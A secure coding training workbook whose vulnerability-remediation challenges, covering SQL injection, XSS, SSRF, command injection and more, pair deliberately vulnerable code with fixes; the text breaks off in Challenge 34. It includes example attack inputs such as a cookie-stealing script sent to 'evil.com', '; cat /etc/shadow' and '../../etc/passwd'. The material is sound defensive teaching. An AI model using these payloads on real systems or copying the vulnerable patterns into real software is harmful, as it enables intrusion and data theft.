# Secure Coding Challenges
**50 Hands-on Vulnerability Remediation Exercises**  
25 Easy · 15 Medium · 10 Hard  
SQL Injection · XSS · SSRF · Command Injection · JWT · CSRF · XXE · Deserialization · Path Traversal · Race Conditions · and more

*Security Training Series — For Educational Use Only*

---

## Table of Contents

### Easy Challenges (1–25)
1. SQL Injection in Login Form *(SQL Injection)*
2. Reflected XSS via Search Input *(Cross-Site Scripting)*
3. Hardcoded Database Credentials *(Hardcoded Secrets)*
4. Insecure Direct Object Reference (IDOR) *(Broken Access Control)*
5. Missing HTTPS / Sensitive Data Over HTTP *(Sensitive Data Exposure)*
6. Open Redirect *(Open Redirect)*
7. Weak Password Hashing with MD5 *(Insecure Authentication)*
8. Verbose Error Messages Leaking Stack Traces *(Security Misconfiguration)*
9. Insecure Cookie Flags *(Session Management Issues)*
10. Directory Listing Enabled *(Security Misconfiguration)*
11. Mass Assignment Vulnerability *(Broken Access Control)*
12. Unvalidated File Extension Upload *(Insecure File Upload)*
13. Sensitive Data in URL Query String *(Sensitive Data Exposure)*
14. Default Admin Credentials Not Changed *(Security Misconfiguration)*
15. Insecure Math.random() for Tokens *(Insecure Authentication)*
16. Unescaped Output in Template *(Cross-Site Scripting)*
17. Logging Sensitive User Data *(Sensitive Data Exposure)*
18. XML External Entity (XXE) — Basic *(XXE)*
19. CORS Misconfiguration — Wildcard Origin *(Security Misconfiguration)*
20. Missing Authorization on Admin Endpoint *(Broken Access Control)*
21. Insecure Redirect After Login with User Input *(Open Redirect)*
22. Prototype Pollution via Object Merge *(Prototype Pollution)*
23. Unprotected Sensitive API Endpoint *(Broken Access Control)*
24. Information Disclosure via HTTP Headers *(Security Misconfiguration)*
25. Storing Plain Text Passwords *(Insecure Authentication)*

### Medium Challenges (26–40)
26. NoSQL Injection in MongoDB Query *(NoSQL Injection)*
27. JWT Algorithm Confusion (none Algorithm) *(JWT Misconfiguration)*
28. Server-Side Request Forgery (SSRF) *(SSRF)*
29. Command Injection via Shell Execution *(Command Injection)*
30. Path Traversal in File Download *(Path Traversal)*
31. CSRF on State-Changing Endpoint *(CSRF)*
32. Insecure Deserialization in Session Data *(Insecure Deserialization)*
33. Stored XSS in Comment System *(Cross-Site Scripting)*
34. Race Condition in Bank Transfer *(Race Conditions)*
35. Unvalidated OAuth Redirect URI *(Insecure Authentication)*
36. XXE via SVG File Upload *(XXE)*
37. Insecure JWT Secret (Weak Key) *(JWT Misconfiguration)*
38. SQL Injection via ORDER BY Clause *(SQL Injection)*
39. Unrestricted File Inclusion *(Security Misconfiguration)*
40. Business Logic — Negative Quantity in Cart *(Business Logic Vulnerabilities)*

### Hard Challenges (41–50)
41. Second-Order SQL Injection *(SQL Injection)*
42. SSTI — Server-Side Template Injection *(Security Misconfiguration)*
43. OAuth PKCE Bypass — State Parameter Missing *(Insecure Authentication)*
44. Timing Attack on HMAC Comparison *(Insecure Authentication)*
45. GraphQL Introspection & Batch Query DoS *(Security Misconfiguration)*
46. Insecure Cryptography — ECB Mode *(Sensitive Data Exposure)*
47. Subdomain Takeover via Dangling DNS *(Security Misconfiguration)*
48. Deserialization RCE via Java ObjectInputStream *(Insecure Deserialization)*
49. DNS Rebinding Attack on Internal API *(SSRF)*
50. Cache Poisoning via Unkeyed Headers *(Security Misconfiguration)*

---

## Easy Challenges (1–25)

> Build foundational security awareness by identifying and fixing common vulnerabilities found in everyday application code.

---

### Challenge 1 · SQL Injection · Easy
**SQL Injection in Login Form** — Language: PHP

**Learning Objective:** Learn to use parameterized queries to prevent SQL injection in authentication.

**Description:** A login endpoint builds its SQL query by directly concatenating user-supplied username and password into a query string. An attacker can bypass authentication by entering `' OR '1'='1` as the username.

**Exploitation Risk:** The query becomes `SELECT * FROM users WHERE username='' OR '1'='1' -- AND password='...'` — the WHERE clause is always true.

**Vulnerable Code:**
```php
<?php
// VULNERABLE: Direct string concatenation
function loginUser($username, $password) {
    $conn = new mysqli("localhost","root","","app");
    $query = "SELECT * FROM users WHERE username='"
           . $username . "' AND password='" . $password . "'";
    $result = $conn->query($query);
    if ($result->num_rows > 0) {
        return true; // logged in!
    }
    return false;
}
loginUser($_POST['username'], $_POST['password']);
?>
```

**Remediation:** Use PDO or MySQLi prepared statements. Bind parameters so user input is never interpreted as SQL syntax. Also hash passwords with `password_hash()` — never compare plain text.

---

### Challenge 2 · Cross-Site Scripting (XSS) · Easy
**Reflected XSS via Search Input** — Language: JavaScript

**Learning Objective:** Understand how unescaped user input injected into HTML leads to reflected XSS.

**Description:** A search results page reflects the query parameter directly into the page DOM using `innerHTML`, allowing an attacker to craft a URL containing a script payload.

**Exploitation Risk:** If a user visits `?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>`, their cookies are exfiltrated.

**Vulnerable Code:**
```javascript
// VULNERABLE: innerHTML with unsanitized user input
const params = new URLSearchParams(window.location.search);
const query = params.get('q');
document.getElementById('results-heading').innerHTML =
    'Search results for: ' + query; // XSS here
```

**Remediation:** Use `textContent` instead of `innerHTML` for plain text, or escape HTML entities before insertion. For rich content, use DOMPurify. Never trust URL parameters.

---

### Challenge 3 · Hardcoded Secrets · Easy
**Hardcoded Database Credentials** — Language: Python

**Learning Objective:** Recognize the risk of committing secrets to source code and learn to use environment variables.

**Description:** Database credentials are hardcoded directly in the source file. When pushed to a shared Git host, anyone with access can read the production password.

**Exploitation Risk:** Credentials in source code survive in Git history even after removal.

**Vulnerable Code:**
```python
# VULNERABLE: Hardcoded credentials
import psycopg2

def get_connection():
    return psycopg2.connect(
        host="prod-db.internal",
        database="customers",
        user="admin",
        password="Sup3rS3cr3tP@ss!"  # <-- hardcoded!
    )
```

**Remediation:** Load secrets from environment variables (`os.environ`) or a secrets manager (AWS Secrets Manager, HashiCorp Vault). Use a `.env` file locally with `python-dotenv` and ensure `.env` is in `.gitignore`.

---

### Challenge 4 · Broken Access Control · Easy
**Insecure Direct Object Reference (IDOR)** — Language: Node.js

**Learning Objective:** Learn why server-side authorization checks are mandatory for every resource request.

**Description:** An API endpoint returns a user profile using a numeric ID from the URL without verifying the requesting user owns that ID.

**Exploitation Risk:** `GET /api/users/42` returns user 42's data regardless of who is logged in.

**Vulnerable Code:**
```javascript
// VULNERABLE: No ownership check
app.get('/api/users/:id', async (req, res) => {
    const user = await db.users.findById(req.params.id);
    if (!user) return res.status(404).json({ error: 'Not found' });
    res.json(user); // returns anyone's profile!
});
```

**Remediation:** After retrieving the resource, verify `req.user.id === user.id` (or that the requester has an admin role). Return 403 Forbidden on mismatch.

---

### Challenge 5 · Sensitive Data Exposure · Easy
**Missing HTTPS / Sensitive Data Over HTTP** — Language: Python

**Learning Objective:** Understand why all traffic carrying sensitive data must be encrypted in transit.

**Description:** A Flask application transmits user login credentials and session tokens over plain HTTP.

**Exploitation Risk:** HTTP traffic is unencrypted. Credentials, tokens, and personal data are visible to anyone on the network path.

**Vulnerable Code:**
```python
# VULNERABLE: Running on HTTP with debug=True in production
from flask import Flask, request, session
app = Flask(__name__)
app.secret_key = 'abc123'

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    session['user'] = username
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)  # plain HTTP!
```

**Remediation:** Deploy behind a TLS-terminating reverse proxy (nginx/Caddy) or use Flask-Talisman. Set `SESSION_COOKIE_SECURE=True`. Redirect all HTTP traffic to HTTPS. Disable debug mode in production.

---

### Challenge 6 · Open Redirect · Easy
**Open Redirect** — Language: Java

**Learning Objective:** Learn to validate redirect destinations to prevent phishing via open redirects.

**Description:** A post-login redirect uses a user-controlled `next` parameter without validation.

**Exploitation Risk:** The victim sees a trusted URL, logs in, then lands on a phishing page.

**Vulnerable Code:**
```java
// VULNERABLE: Unvalidated redirect
@GetMapping("/login")
public String login(@RequestParam String next,
                    HttpServletResponse response) throws IOException {
    // ... authenticate user ...
    response.sendRedirect(next); // attacker-controlled destination!
    return null;
}
```

**Remediation:** Maintain an allowlist of permitted redirect paths. Reject any `next` value that is absolute (starts with `http`/`https`) or does not begin with `/`. Use `URI.create(next).isAbsolute()` to detect absolute URLs.

---

### Challenge 7 · Insecure Authentication · Easy
**Weak Password Hashing with MD5** — Language: PHP

**Learning Objective:** Learn why cryptographic hash functions are inappropriate for password storage.

**Description:** User passwords are stored as MD5 hashes. MD5 is fast, unsalted, and its hashes appear in precomputed rainbow tables.

**Exploitation Risk:** MD5 can compute billions of hashes per second on a GPU.

**Vulnerable Code:**
```php
<?php
// VULNERABLE: MD5 password hashing
function registerUser($username, $password) {
    $hashed = md5($password); // fast, unsalted, broken
    $stmt = $pdo->prepare(
        "INSERT INTO users (username, password) VALUES (?, ?)");
    $stmt->execute([$username, $hashed]);
}

function verifyUser($username, $password) {
    return $stored_hash === md5($password);
}
?>
```

**Remediation:** Use `password_hash($password, PASSWORD_BCRYPT)` with a cost factor of at least 12, or `PASSWORD_ARGON2ID`. Verify with `password_verify()`.

---

### Challenge 8 · Security Misconfiguration · Easy
**Verbose Error Messages Leaking Stack Traces** — Language: Python

**Learning Objective:** Understand why production errors must be generic, with details logged server-side only.

**Description:** Unhandled exceptions are returned directly to the client including full stack traces and internal file paths.

**Exploitation Risk:** Stack traces reveal framework versions, internal paths, variable names, and logic.

**Vulnerable Code:**
```python
# VULNERABLE: Unhandled exceptions bubble to user
from flask import Flask, jsonify
import traceback

app = Flask(__name__)

@app.errorhandler(Exception)
def handle_error(e):
    return jsonify({
        "error": str(e),
        "traceback": traceback.format_exc()  # Returns full traceback to client!
    }), 500
```

**Remediation:** Return only a generic message (`'An unexpected error occurred'`) to the client. Log detailed error information server-side using Python's `logging` module.

---

### Challenge 9 · Session Management Issues · Easy
**Insecure Cookie Flags** — Language: Node.js

**Learning Objective:** Learn the security implications of HttpOnly, Secure, and SameSite cookie attributes.

**Description:** Session cookies are set without the `HttpOnly` or `Secure` flags. JavaScript can read the cookie and the cookie is sent over plain HTTP.

**Vulnerable Code:**
```javascript
// VULNERABLE: Insecure cookie settings
app.post('/login', (req, res) => {
    const token = generateSessionToken();
    res.cookie('session', token, {
        maxAge: 86400000  // no httpOnly, no secure, no sameSite!
    });
    res.json({ success: true });
});
```

**Remediation:** Set `httpOnly: true`, `secure: true`, and `sameSite: 'Strict'`. Example:
```javascript
res.cookie('session', token, { httpOnly: true, secure: true, sameSite: 'Strict' })
```

---

### Challenge 10 · Security Misconfiguration · Easy
**Directory Listing Enabled** — Language: Node.js

**Learning Objective:** Understand how directory listing exposes application internals.

**Description:** An Express static file server is configured to serve the entire project directory with directory listing enabled.

**Exploitation Risk:** Attackers can download source code, find `.env` files, discover hidden endpoints.

**Vulnerable Code:**
```javascript
// VULNERABLE: Serving root directory with listing
const express = require('express');
const serveIndex = require('serve-index');
const app = express();

app.use('/', express.static('.'));
app.use('/', serveIndex('.', { icons: true }));
app.listen(3000);
```

**Remediation:** Serve only a dedicated `public` subdirectory. Never enable `serveIndex` in production. Ensure `.env` and config files are outside the web root.

---

### Challenge 11 · Broken Access Control · Easy
**Mass Assignment Vulnerability** — Language: Node.js

**Learning Objective:** Learn to whitelist permitted fields when binding request bodies to data models.

**Description:** A profile update endpoint passes the entire request body directly to a database update call. An attacker can include privileged fields like `role` or `isAdmin`.

**Exploitation Risk:** `POST /api/profile` with body `{"name":"Alice","role":"admin"}` silently sets the user's role to admin.

**Vulnerable Code:**
```javascript
// VULNERABLE: Mass assignment — req.body passed directly
app.put('/api/profile', authenticate, async (req, res) => {
    const updated = await db.users.update(
        { id: req.user.id },
        { $set: req.body }  // attacker can set any field!
    );
    res.json(updated);
});
```

**Remediation:** Explicitly whitelist allowed fields: `const { name, email, bio } = req.body;`. Use a validation library like Joi or Zod.

---

### Challenge 12 · Insecure File Upload · Easy
**Unvalidated File Extension Upload** — Language: PHP

**Learning Objective:** Understand how attackers upload web shells and how to validate file types securely.

**Description:** A file upload endpoint checks only the client-provided filename extension. An attacker can rename a PHP web shell to bypass the check.

**Exploitation Risk:** Uploading a file named `cmd.php` grants remote code execution.

**Vulnerable Code:**
```php
<?php
// VULNERABLE: Client-supplied extension check only
function uploadFile($file) {
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    $allowed = ['jpg', 'jpeg', 'png', 'gif'];
    if (in_array($ext, $allowed)) {
        move_uploaded_file($file['tmp_name'],
            'uploads/' . $file['name']); // dangerous!
        return true;
    }
    return false;
}
?>
```

**Remediation:** Validate using `finfo_file()` to check the actual MIME type. Store uploads outside the web root. Rename files to random UUIDs. Never serve uploaded files with execution permissions.

---

### Challenge 13 · Sensitive Data Exposure · Easy
**Sensitive Data in URL Query String** — Language: JavaScript

**Learning Objective:** Learn why sensitive tokens and credentials must never appear in URLs.

**Description:** A password reset flow appends the reset token to the URL as a query parameter. This token appears in browser history, server logs, Referer headers, and proxy logs.

**Vulnerable Code:**
```javascript
// VULNERABLE: Token in URL
function sendPasswordReset(email, token) {
    const resetLink =
        `https://app.com/reset?email=${email}&token=${token}`;
    sendEmail(email, 'Reset your password', resetLink);
}

app.get('/reset', (req, res) => {
    const { token } = req.query;
    console.log('Reset attempt with token:', token); // logged!
});
```

**Remediation:** Embed the token in the URL path (`/reset/TOKEN`), use POST for submission, store a hashed version server-side, set a short expiry (15 minutes), and never log the token value.

---

### Challenge 14 · Security Misconfiguration · Easy
**Default Admin Credentials Not Changed** — Language: Python

**Learning Objective:** Learn to enforce credential changes on first login and remove default accounts.

**Description:** An admin panel is shipped with hardcoded default credentials (`admin`/`admin`).

**Exploitation Risk:** Automated scanners routinely attempt default credentials.

**Vulnerable Code:**
```python
# VULNERABLE: Hardcoded default credentials
ADMIN_CREDENTIALS = {
    "username": "admin",
    "password": "admin"  # default, never changed
}

@app.route('/admin/login', methods=['POST'])
def admin_login():
    data = request.json
    if (data['username'] == ADMIN_CREDENTIALS['username'] and
            data['password'] == ADMIN_CREDENTIALS['password']):
        session['admin'] = True
        return jsonify({'success': True})
    return jsonify({'error': 'Invalid credentials'}), 401
```

**Remediation:** Remove all hardcoded default credentials. Force password change on first login. Store credentials in the database using bcrypt. Implement account lockout after failed attempts. Prefer SSO or MFA for admin interfaces.

---

### Challenge 15 · Insecure Authentication · Easy
**Insecure Math.random() for Tokens** — Language: JavaScript

**Learning Objective:** Understand why `Math.random()` is not cryptographically secure.

**Description:** Password reset and CSRF tokens are generated using `Math.random()`, which is a pseudorandom number generator not designed for security.

**Vulnerable Code:**
```javascript
// VULNERABLE: Math.random() for security tokens
function generateResetToken() {
    return Math.random().toString(36).substring(2) +
           Math.random().toString(36).substring(2);
}

function generateCSRFToken() {
    return Math.random().toString(36).substr(2, 16);
}
```

**Remediation:** Use the Web Crypto API: `crypto.randomUUID()` or `crypto.getRandomValues(new Uint8Array(32))` in the browser. In Node.js use `crypto.randomBytes(32).toString('hex')`.

---

### Challenge 16 · Cross-Site Scripting (XSS) · Easy
**Unescaped Output in Template** — Language: Python

**Learning Objective:** Learn how template engines can introduce XSS when auto-escaping is disabled.

**Description:** A Jinja2 template uses the `|safe` filter on user-supplied content, bypassing the framework's built-in auto-escaping.

**Vulnerable Code:**
```python
# VULNERABLE: |safe disables auto-escaping
# template.html:
# <div class="bio">{{ user.bio | safe }}</div>

@app.route('/profile/<int:uid>')
def profile(uid):
    user = db.get_user(uid)
    return render_template('template.html', user=user)
```

**Remediation:** Never use `|safe` on user-controlled data. Rely on Jinja2's default auto-escaping. If rich HTML is required, use a whitelist-based sanitizer like `bleach` before storage.

---

### Challenge 17 · Sensitive Data Exposure · Easy
**Logging Sensitive User Data** — Language: Java

**Learning Objective:** Learn to redact sensitive fields before writing to logs.

**Description:** A payment service logs the full request object including credit card numbers and CVVs.

**Exploitation Risk:** Log files containing card numbers violate PCI DSS.

**Vulnerable Code:**
```java
// VULNERABLE: Logging full payment request
@PostMapping("/payment")
public ResponseEntity<?> processPayment(
        @RequestBody PaymentRequest req) {
    logger.info("Processing payment: {}", req);
    // PaymentRequest.toString() includes cardNumber and cvv!
    paymentService.charge(req);
    return ResponseEntity.ok("Charged");
}
```

**Remediation:** Override `toString()` in sensitive model classes to return a redacted representation. Use structured logging with field-level masking. Never log card numbers, passwords, SSNs, or authentication tokens.

---

### Challenge 18 · XML External Entity (XXE) · Easy
**XML External Entity (XXE) — Basic** — Language: Python

**Learning Objective:** Learn to disable external entity processing when parsing XML.

**Description:** An XML parser processes user-supplied XML with external entity expansion enabled. An attacker can read local files through the parsed output.

**Vulnerable Code:**
```python
# VULNERABLE: lxml with external entities enabled (default)
from lxml import etree

@app.route('/parse', methods=['POST'])
def parse_xml():
    xml_data = request.data
    root = etree.fromstring(xml_data)  # Default parser allows external entities!
    return etree.tostring(root).decode()
```

**Remediation:** Use a safe parser configuration:
```python
parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
```
Better yet, use `defusedxml` which disables all dangerous features by default. Prefer JSON over XML when possible.

---

### Challenge 19 · Security Misconfiguration · Easy
**CORS Misconfiguration — Wildcard Origin** — Language: Node.js

**Learning Objective:** Understand how a wildcard CORS policy allows any website to read API responses.

**Description:** An authenticated API endpoint sets `Access-Control-Allow-Origin: *` along with `Access-Control-Allow-Credentials: true`.

**Vulnerable Code:**
```javascript
// VULNERABLE: Wildcard CORS on authenticated endpoint
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE');
    res.header('Access-Control-Allow-Headers', 'Content-Type,Authorization');
    next();
});
```

**Remediation:** Maintain a strict allowlist of permitted origins. Reflect only allowed origins dynamically. Never combine wildcard origin with credentials.

---

### Challenge 20 · Broken Access Control · Easy
**Missing Authorization on Admin Endpoint** — Language: Python

**Learning Objective:** Learn why every sensitive endpoint must explicitly verify the caller's authorization.

**Description:** An admin endpoint checks only that the caller is authenticated, not that they have administrator privileges.

**Vulnerable Code:**
```python
# VULNERABLE: Auth check but no role check
@app.route('/admin/delete-user/<int:user_id>', methods=['DELETE'])
@login_required  # checks session exists
def delete_user(user_id):
    # Missing: check current_user.role == 'admin'
    db.delete_user(user_id)
    return jsonify({'deleted': user_id})
```

**Remediation:** Add role-based access control: `if current_user.role != 'admin': abort(403)`. Create a reusable `@admin_required` decorator that combines login and role checks.

---

### Challenge 21 · Open Redirect · Easy
**Insecure Redirect After Login with User Input** — Language: TypeScript

**Learning Objective:** Reinforce safe redirect handling by validating paths against a server-side allowlist.

**Description:** A Next.js login page reads the `returnTo` query parameter and uses `router.push()` after authentication with no validation.

**Vulnerable Code:**
```typescript
// VULNERABLE: Unvalidated redirect in Next.js
import { useRouter } from 'next/router';

export default function LoginPage() {
    const router = useRouter();
    const returnTo = router.query.returnTo as string;

    async function handleLogin(credentials: Credentials) {
        await authService.login(credentials);
        router.push(returnTo || '/dashboard');  // unvalidated!
    }
}
```

**Remediation:** Validate that `returnTo` is a relative path:
```typescript
const safe = returnTo && returnTo.startsWith('/') && !returnTo.startsWith('//') 
    ? returnTo : '/dashboard';
```

---

### Challenge 22 · Prototype Pollution · Easy
**Prototype Pollution via Object Merge** — Language: JavaScript

**Learning Objective:** Recognize how recursive object merges on user input can pollute `Object.prototype`.

**Description:** A utility function recursively merges a user-supplied JSON object without checking for the `__proto__` key.

**Exploitation Risk:** Input like `{"__proto__":{"isAdmin":true}}` makes every object appear to have `isAdmin=true`.

**Vulnerable Code:**
```javascript
// VULNERABLE: Recursive merge without __proto__ guard
function merge(target, source) {
    for (const key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);  // __proto__ poisoning!
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

**Remediation:** Check for dangerous keys:
```javascript
if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
```
Alternatively use `Object.create(null)` targets, `structuredClone()`, or lodash's merge.

---

### Challenge 23 · Broken Access Control · Easy
**Unprotected Sensitive API Endpoint** — Language: Node.js

**Learning Objective:** Learn to apply authentication middleware consistently to all sensitive routes.

**Description:** A developer placed the metrics endpoint before the authentication middleware, accidentally exposing it publicly.

**Vulnerable Code:**
```javascript
// VULNERABLE: Metrics route outside auth middleware
const app = express();
const authenticate = require('./middleware/auth');

app.get('/api/metrics', (req, res) => {  // no auth!
    res.json({
        memory: process.memoryUsage(),
        dbQueries: db.getQueryCount(),
        errors: errorTracker.getSummary()
    });
});

app.use('/api', authenticate);  // too late!
app.get('/api/users', getUsers);
```

**Remediation:** Apply authentication middleware before route definitions: `app.use('/api', authenticate)` must come before any `app.get('/api/...')` calls.

---

### Challenge 24 · Security Misconfiguration · Easy
**Information Disclosure via HTTP Headers** — Language: Node.js

**Learning Objective:** Learn to remove or mask HTTP headers that disclose server technology stack.

**Description:** Express.js by default sends an `X-Powered-By: Express` header on every response.

**Vulnerable Code:**
```javascript
// VULNERABLE: Default headers expose technology
const express = require('express');
const app = express();

// X-Powered-By: Express is sent automatically
// No security headers configured at all
app.get('/', (req, res) => {
    res.send('Hello World');
});
```

**Remediation:** Use `app.disable('x-powered-by')` and the `helmet` package: `app.use(helmet())`. Helmet sets `X-Frame-Options`, `Content-Security-Policy`, `X-Content-Type-Options`, `Strict-Transport-Security`, and removes `X-Powered-By`.

---

### Challenge 25 · Insecure Authentication · Easy
**Storing Plain Text Passwords** — Language: C#

**Learning Objective:** Recognize the critical importance of never storing passwords in plain text.

**Description:** A .NET application stores user passwords as plain strings in the database.

**Exploitation Risk:** Plain text passwords violate every compliance framework (GDPR, SOC 2, PCI DSS) and enable credential stuffing attacks.

**Vulnerable Code:**
```csharp
// VULNERABLE: Plain text password storage
public class UserService
{
    public async Task RegisterUser(string username, string password)
    {
        var user = new User
        {
            Username = username,
            Password = password  // stored as plain text!
        };
        await _context.Users.AddAsync(user);
        await _context.SaveChangesAsync();
    }

    public async Task<bool> Login(string username, string password)
    {
        var user = await _context.Users
            .FirstOrDefaultAsync(u => u.Username == username);
        return user?.Password == password;  // plain text comparison!
    }
}
```

**Remediation:** Use ASP.NET Core's built-in Identity framework (PBKDF2 by default), or use `BCrypt.Net-Next`: `BCrypt.HashPassword(password, workFactor: 12)`. Verify with `BCrypt.Verify(password, storedHash)`.

---

## Medium Challenges (26–40)

> Tackle more nuanced vulnerabilities that require deeper understanding of application logic, framework behavior, and multi-step attack chains.

---

### Challenge 26 · NoSQL Injection · Medium
**NoSQL Injection in MongoDB Query** — Language: Node.js

**Learning Objective:** Learn how object injection into MongoDB queries bypasses authentication.

**Description:** A login endpoint passes the request body directly as MongoDB query operators. An attacker can send MongoDB operators instead of string values.

**Exploitation Risk:** Sending `{"username":"admin","password":{"$gt":""}}` returns the admin user because an empty string is less than any actual password.

**Vulnerable Code:**
```javascript
// VULNERABLE: MongoDB operator injection
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    const user = await User.findOne({
        username: username,
        password: password  // MongoDB operators accepted!
    });
    if (user) return res.json({ token: generateToken(user) });
    res.status(401).json({ error: 'Invalid credentials' });
});
```

**Remediation:** Cast query parameters to their expected primitive types:
```javascript
const user = await User.findOne({ username: String(username), password: String(password) });
```
Use Mongoose's strict mode and validate with a schema library.

---

### Challenge 27 · JWT Misconfiguration · Medium
**JWT Algorithm Confusion (none Algorithm)** — Language: Node.js

**Learning Objective:** Understand how accepting `none` as a JWT algorithm allows signature forgery.

**Description:** A JWT verification function passes the algorithm from the token header to the verify call, allowing an attacker to craft a token with `alg:none`.

**Exploitation Risk:** The attacker modifies the payload (sets `role:admin`), changes `alg` to `none`, removes the signature, and the server accepts the token as valid.

**Vulnerable Code:**
```javascript
// VULNERABLE: Algorithm taken from token header
const jwt = require('jsonwebtoken');
const SECRET = process.env.JWT_SECRET;

function verifyToken(token) {
    const header = JSON.parse(
        Buffer.from(token.split('.')[0], 'base64').toString());
    return jwt.verify(token, SECRET, {
        algorithms: [header.alg]  // accepts 'none'!
    });
}
```

**Remediation:** Always specify the expected algorithm explicitly:
```javascript
jwt.verify(token, SECRET, { algorithms: ['HS256'] })
```
Never read the algorithm from the token. Use asymmetric keys (RS256) when possible.

---

### Challenge 28 · SSRF · Medium
**Server-Side Request Forgery (SSRF)** — Language: Python

**Learning Objective:** Learn to validate and restrict URLs before the server makes outbound HTTP requests.

**Description:** A webhook testing feature allows users to specify any URL and the server fetches it. An attacker can target internal cloud metadata endpoints.

**Exploitation Risk:** On AWS, `GET http://169.254.169.254/latest/meta-data/iam/security-credentials/` returns temporary IAM credentials.

**Vulnerable Code:**
```python
# VULNERABLE: SSRF in webhook tester
import requests

@app.route('/webhook/test', methods=['POST'])
def test_webhook():
    url = request.json.get('url')
    response = requests.get(url, timeout=5)
    return jsonify({
        'status': response.status_code,
        'body': response.text
    })
```

**Remediation:** Parse the URL and block private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x), localhost, and internal hostnames. Use an allowlist of permitted external domains. Disable redirects.

---

### Challenge 29 · Command Injection · Medium
**Command Injection via Shell Execution** — Language: Python

**Learning Objective:** Learn why `shell=True` with user input leads to OS command injection.

**Description:** An application uses `subprocess` with `shell=True`, directly interpolating user input into the shell command string.

**Exploitation Risk:** Sending `host=8.8.8.8; cat /etc/shadow` executes both ping and the shadow file read.

**Vulnerable Code:**
```python
# VULNERABLE: shell=True with user-controlled input
import subprocess

@app.route('/ping')
def ping_host():
    host = request.args.get('host', '')
    result = subprocess.run(
        f'ping -c 1 {host}',
        shell=True,  # shell interprets metacharacters!
        capture_output=True,
        text=True
    )
    return result.stdout
```

**Remediation:** Use `shell=False` and pass arguments as a list:
```python
subprocess.run(['ping', '-c', '1', host], shell=False)
```
Validate host against a strict regex `([a-zA-Z0-9.-]+)` before passing it to subprocess.

---

### Challenge 30 · Path Traversal · Medium
**Path Traversal in File Download** — Language: Java

**Learning Objective:** Learn to sanitize file paths to prevent directory traversal attacks.

**Description:** A file download endpoint accepts a filename parameter and reads from a base directory. By sending `../` sequences, an attacker can read arbitrary files.

**Exploitation Risk:** A request for `?file=../../etc/passwd` returns the Linux password file.

**Vulnerable Code:**
```java
// VULNERABLE: Path traversal in file download
@GetMapping("/download")
public ResponseEntity<byte[]> download(
        @RequestParam String filename) throws IOException {
    Path filePath = Paths.get("/app/uploads/" + filename);
    byte[] content = Files.readAllBytes(filePath);
    return ResponseEntity.ok()
        .header("Content-Disposition", "attachment; filename=" + filename)
        .body(content);
}
```

**Remediation:** Resolve the canonical path and verify it starts with the base directory:
```java
Path base = Paths.get("/app/uploads").toRealPath();
Path resolved = base.resolve(filename).normalize();
if (!resolved.startsWith(base)) throw new SecurityException();
```

---

### Challenge 31 · CSRF · Medium
**CSRF on State-Changing Endpoint** — Language: PHP

**Learning Objective:** Understand CSRF attacks and implement synchronizer token pattern protection.

**Description:** A funds transfer endpoint relies solely on session cookies for authentication. A malicious website can auto-submit a hidden form to the bank's transfer endpoint.

**Exploitation Risk:** The victim visits `evil.com` which POSTs to `bank.com/transfer` — the browser automatically includes the session cookie.

**Vulnerable Code:**
```php
<?php
// VULNERABLE: No CSRF protection on money transfer
session_start();
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SESSION['user'])) {
    $to = $_POST['to'];
    $amount = $_POST['amount'];
    transferMoney($_SESSION['user']['id'], $to, $amount);
    echo json_encode(['success' => true]);
}
?>
```

**Remediation:** Generate a cryptographically random CSRF token per session, store it in the session, embed it in forms as a hidden field, and validate it on every state-changing request. Use `SameSite=Strict` as a defense-in-depth layer.

---

### Challenge 32 · Insecure Deserialization · Medium
**Insecure Deserialization in Session Data** — Language: Python

**Learning Objective:** Understand how deserializing untrusted pickle data enables remote code execution.

**Description:** Session data is serialized with Python's `pickle` module and stored in a cookie. An attacker can craft a malicious pickle payload that executes arbitrary OS commands.

**Exploitation Risk:** Pickle's `__reduce__` method can trigger arbitrary function calls including `subprocess.Popen`, equivalent to RCE.

**Vulnerable Code:**
```python
# VULNERABLE: Deserializing user-controlled pickle data
import pickle, base64
from flask import request, session

@app.before_request
def load_session():
    raw = request.cookies.get('session_data')
    if raw:
        data = pickle.loads(base64.b64decode(raw))  # Attacker crafts malicious payload!
        session.update(data)
```

**Remediation:** Never deserialize pickle (or Java ObjectInputStream, PHP unserialize) data from untrusted sources. Use JSON or MessagePack for session data. If binary serialization is required, use HMAC to authenticate the payload before deserialization.

---

### Challenge 33 · Cross-Site Scripting (XSS) · Medium
**Stored XSS in Comment System** — Language: JavaScript

**Learning Objective:** Learn the difference between stored and reflected XSS and how to prevent both.

**Description:** A blog comment system saves user comments to the database and renders them using `innerHTML` without sanitization.

**Exploitation Risk:** Stored XSS persists and affects every user who views the page. It can silently steal credentials, hijack sessions, or deface pages.

**Vulnerable Code:**
```javascript
// VULNERABLE: Stored XSS — innerHTML with DB content
async function renderComments(postId) {
    const comments = await fetch(`/api/comments/${postId}`).then(r => r.json());
    const container = document.getElementById('comments');
    comments.forEach(comment => {
        container.innerHTML +=
            `<div class="comment">
                <strong>${comment.author}</strong>
                <p>${comment.content}</p>
            </div>`;
    });
}
```

**Remediation:** Use `DOMPurify.sanitize(comment.content)` before insertion, or use DOM methods:
```javascript
const p = document.createElement('p');
p.textContent = comment.content;  // automatically escapes HTML
```

---

### Challenge 34 · Race Conditions · Medium
**Race Condition in Bank Transfer** — Language: Java

**Learning Objective:** Learn to use database transactions and pessimistic locking to prevent TOCTOU races.

**Description:** A balance transfer operation reads the account balance, checks it's sufficient, then deducts in separate operations. Concurrent requests can both pass the balance check before either deduction occurs.

**Exploitation Risk:** Two concurrent $100 transfer requests both read balance=$100, both pass the check, and both complete — resulting in a $200 overdraft.

**Vulnerable Code:**
```java
// VULNERABLE: TOCTOU race condition
@Transactional
